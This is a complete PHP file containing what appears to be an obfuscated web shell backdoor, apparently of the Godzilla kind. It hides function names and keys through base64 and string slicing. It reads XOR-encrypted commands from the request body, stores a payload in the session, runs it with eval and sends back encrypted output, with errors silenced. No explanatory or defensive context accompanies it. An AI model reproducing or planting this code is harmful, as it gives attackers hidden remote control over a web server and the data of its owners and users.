<?php
@session_start();
@set_time_limit(0);
@error_reporting(0);
function encode($D,$K){
    for($i=0;$i<strlen($D);$i++) {
        $c = $K[$i+1&15];
        $D[$i] = $D[$i]^$c;
    }
    return $D;
}
function strr11($strr12){
    return eval($strr12);
}

$strr2 = substr(base64_decode("Nmppc2RmXiBTZWMtRmV0Y2gtQ3JvIHMxMzZnZHM==",false),8,13);
$strr0 = substr(base64_decode("Nmppc2RmXiAzYzZlMGI4YTljMTUyMjRhIGZ1ZDJrczI4",false),8,16);
$strr1 = substr(base64_decode("Nmppc2RmXiBwaHA6Ly9pbnB1dCBmdWQya3MyOA==",false),8,11);
$strr3 = substr(base64_decode("Nmppc2RmXiBnZXRCYXNpY3NJbmZvIGZ1ZDJrczI4",false),8,13);
$strr7 = substr("dagesfilxadg!`",5,3);
$strr8 = substr("e_get_conxeea%",0,9);
$strr9 = substr("e@#tentsfw~12f",3,5);
$strr10 = $strr7.$strr8.$strr9;
$strr5 = $strr10($strr1);

if ($strr5!==false){
    $strr5=encode($strr5,$strr0);
    if (isset($_SESSION[$strr2])){
        $strr4=encode($_SESSION[$strr2],$strr0);
        if (strpos($strr4,$strr3)===false){
            $strr4=encode($strr4,$strr0);
        }
		strr11($strr4);
        $strr6 = substr("aeghr!run",6,3);
        echo encode(@($strr6)($strr5),$strr0);
    }else{
        if (strpos($strr5,$strr3)!==false){
            $_SESSION[$strr2]=encode($strr5,$strr0);
        }
    }
}
?>